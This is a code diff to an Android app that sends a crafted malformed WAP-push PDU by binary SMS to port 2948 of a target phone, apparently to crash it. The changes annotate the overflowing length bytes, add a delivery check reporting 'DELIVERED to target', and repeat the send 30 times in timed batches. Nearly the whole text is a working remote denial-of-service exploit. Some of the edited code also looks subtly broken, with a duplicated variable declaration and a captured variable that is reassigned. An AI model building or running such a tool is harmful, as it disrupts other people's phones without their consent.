@@ -25,7 +25,10 @@ import java.util.Locale;
 public class MainActivity extends Activity {
 
     private static final byte[] CRASH_PDU = {
-        0x01, 0x06, (byte) 0x88, (byte) 0x80, (byte) 0x80, (byte) 0x80, 0x00, (byte) 0xBE
+         0x01, 0x06,                          // transaction id, PDU type
+         (byte)0x88, (byte)0x80, (byte)0x80,  // uintvar continuation bytes
+         (byte)0x80, (byte)0xFF,              // final uintvar byte -> value >= 0x80000000
+         (byte)0xBE                           // trailing data
     };
 
     private EditText phoneInput;
@@ -41,6 +44,16 @@ public class MainActivity extends Activity {
             status.append("\n" + msg);
         }
     };
+    private final BroadcastReceiver deliveredReceiver = new BroadcastReceiver() {
+    @Override
+    public void onReceive(Context c, Intent i) {
+        int rc = getResultCode();
+        String msg = (rc == Activity.RESULT_OK)
+                ? "DELIVERED to target"
+                : "DELIVERY FAILED rc=" + rc;
+        status.append("\n" + msg);
+    }
+};
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -79,12 +92,14 @@ public class MainActivity extends Activity {
         requestPermissions(new String[] { Manifest.permission.SEND_SMS }, 1);
 
         registerReceiver(sentReceiver, new IntentFilter("com.markb.SMS_SENT"), Context.RECEIVER_NOT_EXPORTED);
+        registerReceiver(deliveredReceiver, new IntentFilter("com.markb.SMS_DELIVERED"), Context.RECEIVER_NOT_EXPORTED);
     }
 
     @Override
     protected void onDestroy() {
         super.onDestroy();
         try { unregisterReceiver(sentReceiver); } catch (Exception ignored) {}
+        try { unregisterReceiver(deliveredReceiver); } catch (Exception ignored) {}
     }
 
     private void sendCrashSms() {
@@ -101,14 +116,35 @@ public class MainActivity extends Activity {
         try {
             SmsManager mgr = getSystemService(SmsManager.class);
             if (mgr == null) mgr = SmsManager.getDefault();
+            PendingIntent deliveredPI = PendingIntent.getBroadcast(
+                    this, 1,                                    // request code 1 (distinct from sentPI's 0)
+                    new Intent("com.markb.SMS_DELIVERED"),      // separate action for delivery
+                    PendingIntent.FLAG_IMMUTABLE);              // required on modern Android
 
-            PendingIntent sentPI = PendingIntent.getBroadcast(
-                    this, 0,
+          new Thread(() -> {
+            for (int batch = 0; batch < 3; batch++) {
+                for (int i = 0; i < 10; i++) {
+                    PendingIntent sentPI = PendingIntent.getBroadcast(
+                    this, batch * 10 + i,
                     new Intent("com.markb.SMS_SENT"),
                     PendingIntent.FLAG_IMMUTABLE);
 
-            mgr.sendDataMessage(dest, null, (short) 2948, CRASH_PDU, sentPI, null);
-
+                    PendingIntent deliveredPI = PendingIntent.getBroadcast(
+                    this, 100 + batch * 10 + i,
+                    new Intent("com.markb.SMS_DELIVERED"),
+                    PendingIntent.FLAG_IMMUTABLE);
+                    mgr.sendDataMessage(dest, null, (short) 2948, CRASH_PDU, sentPI, deliveredPI);
+                    try { Thread.sleep(500); }
+                    catch (InterruptedException e) { Thread.currentThread().interrupt(); return; }
+        }
+                if (batch < 2) {
+                    try { Thread.sleep(60_000); }
+                    catch (InterruptedException e) { Thread.currentThread().interrupt(); return; }
+        }
+    }
+    runOnUiThread(() -> status.append("\nloop done"));
+}).start();          // start the thread
+            
             String ts = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
             status.setText("[" + ts + "] Attempting send to: " + dest + "\n");
             
